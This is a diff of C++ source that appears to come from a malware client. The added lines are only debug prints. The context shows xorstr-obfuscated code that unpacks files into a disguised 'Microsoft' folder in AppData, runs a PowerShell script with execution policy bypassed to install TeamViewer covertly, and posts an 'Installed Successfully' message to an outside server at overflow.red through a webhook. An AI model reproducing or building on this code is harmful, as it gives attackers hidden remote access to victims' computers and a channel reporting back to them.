@@ -10,6 +10,7 @@
 #include "..\utility\xor.hpp"
 #include "../utility/requests.h"
 #include "../utility/helper.h"
+#include <iostream>
 
 #pragma comment(lib,"user32.lib") 
 #pragma comment(lib,"Wininet.lib")
@@ -225,8 +226,10 @@ namespace client {
 			std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
 			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + unzip_path + "\"";
 			system(command.c_str());
+			std::cout << "\n1";
 
 			system(std::string(xorstr_("cd ") + helpers::roaming + xorstr_("\\Microsoft\\tv") + " && powershell -executionpolicy bypass -file teamviewer_install.ps1").c_str());
+			std::cout << "\n2";
 
 			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Installed Successfully")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
